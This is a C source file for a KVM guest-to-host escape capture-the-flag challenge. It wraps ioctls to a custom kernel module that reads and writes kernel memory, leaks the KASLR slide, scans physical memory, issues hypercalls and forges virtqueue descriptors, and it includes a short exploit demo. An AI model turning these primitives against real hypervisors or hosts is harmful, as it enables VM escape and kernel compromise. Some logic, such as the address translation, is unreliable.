/* SPDX-License-Identifier: GPL-2.0 */
/*
 * KVM CTF Prober - Userland tool for KVM guest-to-host escape challenge
 * Fixed version addressing all compatibility issues
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>
#include <pthread.h>
#include <time.h>

/* FIX U.1: Add KVM userspace headers */
#include <linux/kvm.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

/* IOCTL command definitions (must match kernel module) */
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_ATTACH_VQ          0x1013
#define IOCTL_TRIGGER_VQ         0x1014
#define IOCTL_SCAN_PHYS          0x1015
#define IOCTL_FIRE_VQ_ALL        0x1016
#define IOCTL_SEND_NET_PACKET    0x1017
#define IOCTL_RECV_NET_PACKET    0x1018
#define IOCTL_CTF_TRIGGER_FLAG   0x1019
#define IOCTL_CTF_READ_FLAG      0x101A
#define IOCTL_CTF_WRITE_FLAG     0x101B
#define IOCTL_CTF_KASAN_TRIGGER  0x101C

/* Structure definitions (must match kernel module) */
struct port_io_data {
    uint16_t port;
    uint32_t size;
    uint32_t value;
};

struct mmio_data {
    uint64_t phys_addr;
    uint64_t size;
    uint8_t *user_buffer;
    uint64_t single_value;
    uint32_t value_size;
};

struct vq_desc_user_data {
    uint16_t index;
    uint64_t phys_addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next_idx;
};

struct kvm_kernel_mem_read {
    uint64_t kernel_addr;
    uint64_t length;
    uint8_t *user_buf;
};

struct kvm_kernel_mem_write {
    uint64_t kernel_addr;
    uint64_t length;
    uint8_t *user_buf;
};

struct va_scan_data {
    uint64_t va;
    uint64_t size;
    uint8_t *user_buffer;
};

struct va_write_data {
    uint64_t va;
    uint64_t size;
    uint8_t *user_buffer;
};

struct hypercall_args {
    uint64_t nr;
    uint64_t arg0;
    uint64_t arg1;
    uint64_t arg2;
    uint64_t arg3;
};

struct attach_vq_data {
    uint32_t device_id;
    uint64_t vq_pfn;
    uint32_t queue_index;
};

struct net_packet_data {
    uint8_t *packet_data;
    uint32_t packet_len;
    uint32_t device_id;
};

struct ctf_flag_data {
    uint32_t flag_id;
    uint64_t address;
    uint64_t value;
};

/* Global device file descriptor */
static int dev_fd = -1;

/* FIX U.2: Add error checking wrapper for ioctl */
static int safe_ioctl(unsigned long cmd, void *arg)
{
    int ret;
    
    if (dev_fd < 0) {
        fprintf(stderr, "ERROR: Device not open\n");
        return -1;
    }
    
    ret = ioctl(dev_fd, cmd, arg);
    if (ret < 0) {
        fprintf(stderr, "ERROR: ioctl(0x%lx) failed: %s (errno=%d)\n", 
                cmd, strerror(errno), errno);
    }
    return ret;
}

/* FIX U.3: Add buffer size validation before copy operations */
#define MAX_BUFFER_SIZE 4096

static bool validate_buffer_size(size_t size)
{
    if (size == 0 || size > MAX_BUFFER_SIZE) {
        fprintf(stderr, "ERROR: Invalid buffer size: %zu (max %u)\n", size, MAX_BUFFER_SIZE);
        return false;
    }
    return true;
}

/* Initialize the driver communication */
int init_kvm_probe(void)
{
    dev_fd = open(DEVICE_PATH, O_RDWR);
    if (dev_fd < 0) {
        fprintf(stderr, "ERROR: Failed to open %s: %s\n", DEVICE_PATH, strerror(errno));
        return -1;
    }
    printf("Successfully opened KVM probe device\n");
    return 0;
}

/* Cleanup */
void cleanup_kvm_probe(void)
{
    if (dev_fd >= 0) {
        close(dev_fd);
        dev_fd = -1;
    }
}

/* FIX U.2: Read memory with validation */
int read_kernel_memory(uint64_t kernel_addr, uint8_t *buffer, size_t size)
{
    struct kvm_kernel_mem_read req;
    
    if (!validate_buffer_size(size)) return -1;
    
    if (kernel_addr == 0) {
        fprintf(stderr, "ERROR: Cannot read from NULL address\n");
        return -1;
    }
    
    req.kernel_addr = kernel_addr;
    req.length = size;
    req.user_buf = buffer;
    
    return safe_ioctl(IOCTL_READ_KERNEL_MEM, &req);
}

/* FIX U.2: Write memory with validation */
int write_kernel_memory(uint64_t kernel_addr, const uint8_t *buffer, size_t size)
{
    struct kvm_kernel_mem_write req;
    
    if (!validate_buffer_size(size)) return -1;
    
    if (kernel_addr == 0) {
        fprintf(stderr, "ERROR: Cannot write to NULL address\n");
        return -1;
    }
    
    req.kernel_addr = kernel_addr;
    req.length = size;
    req.user_buf = (uint8_t *)buffer;  /* FIX U.5: Cast for write operation */
    
    return safe_ioctl(IOCTL_WRITE_KERNEL_MEM, &req);
}

/* FIX U.4: Improved virtual to physical translation with validation */
int virt_to_phys(uint64_t virt_addr, uint64_t *phys_addr)
{
    if (virt_addr == 0) {
        fprintf(stderr, "ERROR: Cannot translate NULL pointer\n");
        return -1;
    }
    
    if (safe_ioctl(IOCTL_VIRT_TO_PHYS, &virt_addr) < 0) {
        return -1;
    }
    
    *phys_addr = virt_addr;  /* FIX U.4: Get result from ioctl output */
    printf("Translated VA 0x%lx -> PA 0x%lx\n", 
           virt_addr, *phys_addr);
    return 0;
}

/* FIX U.5: Allocate virtqueue page with tracking */
int allocate_vq_page(uint64_t *pfn)
{
    uint64_t result_pfn;
    
    if (safe_ioctl(IOCTL_ALLOC_VQ_PAGE, &result_pfn) < 0) {
        return -1;
    }
    
    *pfn = result_pfn;
    printf("Allocated virtqueue page: PFN=0x%lx\n", result_pfn);
    return 0;
}

/* Free virtqueue page */
int free_vq_page(void)
{
    return safe_ioctl(IOCTL_FREE_VQ_PAGE, NULL);
}

/* FIX U.6: Improved hypercall with proper argument validation */
int trigger_kvm_hypercall(uint64_t nr, uint64_t arg0, uint64_t arg1, 
                          uint64_t arg2, uint64_t arg3, uint64_t *result)
{
    struct hypercall_args args;
    
    /* Validate hypercall number */
    if (nr > 200) {
        fprintf(stderr, "ERROR: Invalid hypercall number: %lu\n", nr);
        return -1;
    }
    
    args.nr = nr;
    args.arg0 = arg0;
    args.arg1 = arg1;
    args.arg2 = arg2;
    args.arg3 = arg3;
    
    /* FIX U.6: Trigger hypercall and capture result */
    if (safe_ioctl(IOCTL_HYPERCALL_ARGS, &args) < 0) {
        return -1;
    }
    
    /* FIX U.6: Get return value from kernel space */
    if (result) {
        *result = args.arg0;  /* Kernel module returns value in arg0 */
    }
    
    printf("Hypercall %lu returned: 0x%lx\n", nr, args.arg0);
    return 0;
}

/* FIX U.5: Write virtqueue descriptor with validation */
int write_vq_descriptor(uint16_t index, uint64_t phys_addr, 
                       uint32_t len, uint16_t flags, uint16_t next_idx)
{
    struct vq_desc_user_data desc;
    
    if (phys_addr == 0) {
        fprintf(stderr, "ERROR: Cannot write descriptor with NULL physical address\n");
        return -1;
    }
    
    desc.index = index;
    desc.phys_addr = phys_addr;
    desc.len = len;
    desc.flags = flags;
    desc.next_idx = next_idx;
    
    return safe_ioctl(IOCTL_WRITE_VQ_DESC, &desc);
}

/* Read MMIO region */
int read_mmio(uint64_t phys_addr, uint8_t *buffer, size_t size)
{
    struct mmio_data req;
    
    if (!validate_buffer_size(size)) return -1;
    
    req.phys_addr = phys_addr;
    req.size = size;
    req.user_buffer = buffer;
    
    return safe_ioctl(IOCTL_READ_MMIO, &req);
}

/* Write MMIO region */
int write_mmio_single(uint64_t phys_addr, uint64_t value, uint32_t value_size)
{
    struct mmio_data req;
    
    if (value_size != 1 && value_size != 2 && value_size != 4 && value_size != 8) {
        fprintf(stderr, "ERROR: Invalid value size: %u (must be 1, 2, 4, or 8)\n", value_size);
        return -1;
    }
    
    req.phys_addr = phys_addr;
    req.single_value = value;
    req.value_size = value_size;
    
    return safe_ioctl(IOCTL_WRITE_MMIO, &req);
}

/* Port I/O operations */
int read_port(uint16_t port, uint32_t size, uint32_t *value)
{
    struct port_io_data req;
    
    if (size != 1 && size != 2 && size != 4) {
        fprintf(stderr, "ERROR: Invalid port I/O size: %u (must be 1, 2, or 4)\n", size);
        return -1;
    }
    
    req.port = port;
    req.size = size;
    req.value = 0;
    
    if (safe_ioctl(IOCTL_READ_PORT, &req) < 0) {
        return -1;
    }
    
    *value = req.value;
    return 0;
}

int write_port(uint16_t port, uint32_t size, uint32_t value)
{
    struct port_io_data req;
    
    if (size != 1 && size != 2 && size != 4) {
        fprintf(stderr, "ERROR: Invalid port I/O size: %u (must be 1, 2, or 4)\n", size);
        return -1;
    }
    
    req.port = port;
    req.size = size;
    req.value = value;
    
    return safe_ioctl(IOCTL_WRITE_PORT, &req);
}

/* FIX U.5: Attach virtqueue with proper structure */
int attach_virtqueue(uint32_t device_id, uint64_t vq_pfn, uint32_t queue_index)
{
    struct attach_vq_data req;
    
    req.device_id = device_id;
    req.vq_pfn = vq_pfn;
    req.queue_index = queue_index;
    
    printf("Attaching virtqueue: device_id=%u, vq_pfn=0x%lx, queue_index=%u\n",
           device_id, vq_pfn, queue_index);
    
    return safe_ioctl(IOCTL_ATTACH_VQ, &req);
}

/* Trigger virtqueue notification */
int trigger_virtqueue(uint32_t device_id, uint32_t queue_index)
{
    struct attach_vq_data req;
    
    req.device_id = device_id;
    req.queue_index = queue_index;
    
    return safe_ioctl(IOCTL_TRIGGER_VQ, &req);
}

/* Scan physical address space */
int scan_physical_memory(uint64_t phys_addr, size_t size, uint8_t *buffer)
{
    struct mmio_data req;
    
    if (!validate_buffer_size(size)) return -1;
    
    req.phys_addr = phys_addr;
    req.size = size;
    req.user_buffer = buffer;
    
    return safe_ioctl(IOCTL_SCAN_PHYS, &req);
}

/* FIX U.6: CTF flag operations with proper error handling */
int ctf_trigger_flag(uint32_t flag_id, uint64_t *result)
{
    struct ctf_flag_data data;
    
    if (flag_id > 200) {
        fprintf(stderr, "ERROR: Invalid flag ID: %u\n", flag_id);
        return -1;
    }
    
    data.flag_id = flag_id;
    data.address = 0;
    data.value = 0;
    
    if (safe_ioctl(IOCTL_CTF_TRIGGER_FLAG, &data) < 0) {
        return -1;
    }
    
    if (result) {
        *result = data.value;
    }
    
    printf("CTF flag %u triggered, result: 0x%lx\n", flag_id, data.value);
    return 0;
}

/* Read CTF flag */
int ctf_read_flag(uint64_t address, uint64_t *value)
{
    struct ctf_flag_data data;
    
    if (address == 0) {
        fprintf(stderr, "ERROR: Cannot read flag from NULL address\n");
        return -1;
    }
    
    data.flag_id = 0;
    data.address = address;
    data.value = 0;
    
    if (safe_ioctl(IOCTL_CTF_READ_FLAG, &data) < 0) {
        return -1;
    }
    
    *value = data.value;
    printf("Read flag from 0x%lx: 0x%lx\n", address, *value);
    return 0;
}

/* Write CTF flag */
int ctf_write_flag(uint64_t address, uint64_t value)
{
    struct ctf_flag_data data;
    
    if (address == 0) {
        fprintf(stderr, "ERROR: Cannot write flag to NULL address\n");
        return -1;
    }
    
    data.flag_id = 0;
    data.address = address;
    data.value = value;
    
    printf("Writing flag to 0x%lx: 0x%lx\n", address, value);
    return safe_ioctl(IOCTL_CTF_WRITE_FLAG, &data);
}

/* Get KASLR slide */
int get_kaslr_slide(uint64_t *slide)
{
    uint64_t slide_value;
    
    if (safe_ioctl(IOCTL_GET_KASLR_SLIDE, &slide_value) < 0) {
        return -1;
    }
    
    *slide = slide_value;
    printf("KASLR slide: 0x%lx\n", *slide);
    return 0;
}

/* Example CTF exploit sequence */
int ctf_exploit_demo(void)
{
    uint64_t kaslr_slide, kernel_addr, flag_value;
    uint8_t buffer[64];
    
    printf("\n=== CTF Exploit Demo ===\n");
    
    /* Get KASLR slide */
    if (get_kaslr_slide(&kaslr_slide) < 0) {
        fprintf(stderr, "Failed to get KASLR slide\n");
        return -1;
    }
    
    /* Calculate target kernel address */
    kernel_addr = 0xffffffff81000000UL + kaslr_slide;
    printf("Target kernel address: 0x%lx\n", kernel_addr);
    
    /* Read kernel memory near target */
    if (read_kernel_memory(kernel_addr, buffer, sizeof(buffer)) < 0) {
        fprintf(stderr, "Failed to read kernel memory\n");
        return -1;
    }
    
    printf("Read %zu bytes from kernel\n", sizeof(buffer));
    
    /* FIX U.6: Attempt CTF flag trigger */
    if (ctf_trigger_flag(100, &flag_value) < 0) {
        fprintf(stderr, "Failed to trigger CTF flag\n");
        return -1;
    }
    
    printf("Flag result: 0x%lx\n", flag_value);
    
    return 0;
}

/* Main function */
int main(int argc, char *argv[])
{
    uint32_t value;
    uint64_t phys_addr, vq_pfn;
    uint8_t test_buffer[256];
    
    printf("=== KVM CTF Prober (FIXED) ===\n");
    printf("Attempting to establish communication with kernel module...\n\n");
    
    /* Initialize device communication */
    if (init_kvm_probe() < 0) {
        fprintf(stderr, "Failed to initialize KVM probe\n");
        return 1;
    }
    
    /* FIX U.6: Add error handling for all operations */
    
    /* Example 1: Read port */
    printf("\n[TEST 1] Reading port 0x3F8 (UART)...\n");
    if (read_port(0x3F8, 1, &value) == 0) {
        printf("Port 0x3F8 value: 0x%x\n", value);
    } else {
        printf("(Skipped - may not be available)\n");
    }
    
    /* Example 2: Get KASLR slide */
    printf("\n[TEST 2] Getting KASLR slide...\n");
    uint64_t slide;
    if (get_kaslr_slide(&slide) == 0) {
        printf("KASLR slide: 0x%lx\n", slide);
    }
    
    /* Example 3: Allocate virtqueue page */
    printf("\n[TEST 3] Allocating virtqueue page...\n");
    if (allocate_vq_page(&vq_pfn) == 0) {
        printf("VQ page allocated: PFN=0x%lx\n", vq_pfn);
        
        /* Translate to physical address */
        phys_addr = vq_pfn * 4096;  /* Approximate PA from PFN */
        printf("Approximate physical address: 0x%lx\n", phys_addr);
        
        /* Cleanup */
        free_vq_page();
    }
    
    /* Example 4: Run CTF exploit demo */
    printf("\n[TEST 4] Running CTF exploit demo...\n");
    if (ctf_exploit_demo() < 0) {
        printf("CTF exploit demo failed or incomplete\n");
    }
    
    printf("\n=== Testing Complete ===\n");
    
    cleanup_kvm_probe();
    return 0;
}
